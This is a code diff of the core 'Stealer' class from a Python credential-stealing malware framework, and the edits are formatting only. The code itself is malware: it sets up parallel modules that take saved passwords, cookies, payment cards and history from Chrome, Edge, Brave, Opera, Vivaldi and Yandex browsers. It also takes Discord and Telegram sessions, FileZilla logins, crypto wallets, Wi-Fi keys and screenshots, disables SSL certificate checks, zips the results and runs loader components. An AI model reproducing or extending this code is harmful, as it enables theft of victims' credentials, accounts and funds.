@@ -8,7 +8,17 @@ from stink.enums import Features, Utils, Protectors
 from stink.helpers import functions, MemoryStorage
 from stink.helpers.config import MultistealerConfig, Browsers
 from stink.utils import Message, Protector, Loader, Grabber
-from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Wallets, Wifi
+from stink.modules import (
+    Chromium,
+    Discord,
+    FileZilla,
+    Processes,
+    Screenshot,
+    System,
+    Telegram,
+    Wallets,
+    Wifi,
+)
 
 
 class Stealer(Thread):
@@ -23,7 +33,7 @@ class Stealer(Thread):
         loaders: List[Loader] = None,
         protectors: List[Protectors] = None,
         grabbers: List[Grabber] = None,
-        delay: int = 0
+        delay: int = 0,
     ):
         Thread.__init__(self, name="Stealer")
 
@@ -54,15 +64,19 @@ class Stealer(Thread):
         self.__config = MultistealerConfig()
         self.__storage = MemoryStorage()
 
-        browser_functions = [module for module in [
-            Features.passwords,
-            Features.cookies,
-            Features.cards,
-            Features.history,
-            Features.bookmarks,
-            Features.extensions,
-            Features.wallets
-        ] if module in features or Features.all in features]
+        browser_functions = [
+            module
+            for module in [
+                Features.passwords,
+                Features.cookies,
+                Features.cards,
+                Features.history,
+                Features.bookmarks,
+                Features.extensions,
+                Features.wallets,
+            ]
+            if module in features or Features.all in features
+        ]
         browser_statuses = len(browser_functions) > 0
 
         self.__methods = [
@@ -72,9 +86,9 @@ class Stealer(Thread):
                     Browsers.CHROME.value,
                     self.__config.BrowsersData[Browsers.CHROME]["path"],
                     self.__config.BrowsersData[Browsers.CHROME]["process"],
-                    browser_functions
+                    browser_functions,
                 ),
-                "status": browser_statuses
+                "status": browser_statuses,
             },
             {
                 "object": Chromium,
@@ -82,9 +96,9 @@ class Stealer(Thread):
                     Browsers.OPERA_GX.value,
                     self.__config.BrowsersData[Browsers.OPERA_GX]["path"],
                     self.__config.BrowsersData[Browsers.OPERA_GX]["process"],
-                    browser_functions
+                    browser_functions,
                 ),
-                "status": browser_statuses
+                "status": browser_statuses,
             },
             {
                 "object": Chromium,
@@ -92,9 +106,9 @@ class Stealer(Thread):
                     Browsers.OPERA_DEFAULT.value,
                     self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["path"],
                     self.__config.BrowsersData[Browsers.OPERA_DEFAULT]["process"],
-                    browser_functions
+                    browser_functions,
                 ),
-                "status": browser_statuses
+                "status": browser_statuses,
             },
             {
                 "object": Chromium,
@@ -102,9 +116,9 @@ class Stealer(Thread):
                     Browsers.EDGE.value,
                     self.__config.BrowsersData[Browsers.EDGE]["path"],
                     self.__config.BrowsersData[Browsers.EDGE]["process"],
-                    browser_functions
+                    browser_functions,
                 ),
-                "status": browser_statuses
+                "status": browser_statuses,
             },
             {
                 "object": Chromium,
@@ -112,9 +126,9 @@ class Stealer(Thread):
                     Browsers.BRAVE.value,
                     self.__config.BrowsersData[Browsers.BRAVE]["path"],
                     self.__config.BrowsersData[Browsers.BRAVE]["process"],
-                    browser_functions
+                    browser_functions,
                 ),
-                "status": browser_statuses
+                "status": browser_statuses,
             },
             {
                 "object": Chromium,
@@ -122,9 +136,9 @@ class Stealer(Thread):
                     Browsers.VIVALDI.value,
                     self.__config.BrowsersData[Browsers.VIVALDI]["path"],
                     self.__config.BrowsersData[Browsers.VIVALDI]["process"],
-                    browser_functions
+                    browser_functions,
                 ),
-                "status": browser_statuses
+                "status": browser_statuses,
             },
             {
                 "object": Chromium,
@@ -132,66 +146,50 @@ class Stealer(Thread):
                     Browsers.YANDEX.value,
                     self.__config.BrowsersData[Browsers.YANDEX]["path"],
                     self.__config.BrowsersData[Browsers.YANDEX]["process"],
-                    browser_functions
+                    browser_functions,
                 ),
-                "status": browser_statuses
+                "status": browser_statuses,
             },
             {
                 "object": System,
-                "arguments": (
-                    "System",
-                ),
-                "status": Features.system in features or Features.all in features
+                "arguments": ("System",),
+                "status": Features.system in features or Features.all in features,
             },
             {
                 "object": Processes,
-                "arguments": (
-                    "System",
-                ),
-                "status": Features.processes in features or Features.all in features
+                "arguments": ("System",),
+                "status": Features.processes in features or Features.all in features,
             },
             {
                 "object": Wifi,
-                "arguments": (
-                    "System",
-                ),
-                "status": Features.wifi in features or Features.all in features
+                "arguments": ("System",),
+                "status": Features.wifi in features or Features.all in features,
             },
             {
                 "object": Screenshot,
-                "arguments": (
-                    "System",
-                ),
-                "status": Features.screenshot in features or Features.all in features
+                "arguments": ("System",),
+                "status": Features.screenshot in features or Features.all in features,
             },
             {
                 "object": Discord,
-                "arguments": (
-                    "Programs/Discord",
-                ),
-                "status": Features.discord in features or Features.all in features
+                "arguments": ("Programs/Discord",),
+                "status": Features.discord in features or Features.all in features,
             },
             {
                 "object": Telegram,
-                "arguments": (
-                    "Programs/Telegram",
-                ),
-                "status": Features.telegram in features or Features.all in features
+                "arguments": ("Programs/Telegram",),
+                "status": Features.telegram in features or Features.all in features,
             },
             {
                 "object": FileZilla,
-                "arguments": (
-                    "Programs/FileZilla",
-                ),
-                "status": Features.filezilla in features or Features.all in features
+                "arguments": ("Programs/FileZilla",),
+                "status": Features.filezilla in features or Features.all in features,
             },
             {
                 "object": Wallets,
-                "arguments": (
-                    "Wallets",
-                ),
-                "status": Features.wallets in features or Features.all in features
-            }
+                "arguments": ("Wallets",),
+                "status": Features.wallets in features or Features.all in features,
+            },
         ]
 
     def run(self) -> None:
@@ -205,7 +203,6 @@ class Stealer(Thread):
         - None.
         """
         try:
-
             sleep(self.__delay)
 
             if self.__message is True:
@@ -216,22 +213,29 @@ class Stealer(Thread):
             ssl._create_default_https_context = ssl._create_unverified_context
 
             with Pool(processes=self.__config.PoolSize) as pool:
-                results = pool.starmap(functions.run_process, [
-                    (method["object"], method["arguments"]) for method in self.__methods if method["status"] is True
-                ])
+                results = pool.starmap(
+                    functions.run_process,
+                    [
+                        (method["object"], method["arguments"])
+                        for method in self.__methods
+                        if method["status"] is True
+                    ],
+                )
             pool.close()
 
             if self.__grabbers:
-
                 with Pool(processes=self.__config.PoolSize) as pool:
-                    grabber_results = pool.starmap(functions.run_process, [
-                        (grabber, None) for grabber in self.__grabbers
-                    ])
+                    grabber_results = pool.starmap(
+                        functions.run_process,
+                        [(grabber, None) for grabber in self.__grabbers],
+                    )
                 pool.close()
 
                 results += grabber_results
 
-            self.__storage.create_zip([file for files in results if files for file in files])
+            self.__storage.create_zip(
+                [file for files in results if files for file in files]
+            )
 
             for loader in self.__loaders:
                 loader.run()
